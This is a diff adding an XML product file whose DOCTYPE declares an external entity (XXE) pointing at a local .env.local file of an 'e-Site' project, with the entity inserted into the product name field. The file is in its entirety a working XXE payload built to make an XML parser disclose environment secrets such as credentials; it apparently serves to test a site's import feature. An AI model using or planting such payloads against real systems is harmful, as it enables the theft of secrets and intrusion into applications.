@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///C:/Users/Mahmoud Abdellatif/Desktop/e-Site/.env.local">
+]>
+<products>
+    <product>
+        <name>&xxe;</name>
+        <price>99.99</price>
+    </product>
+</products>
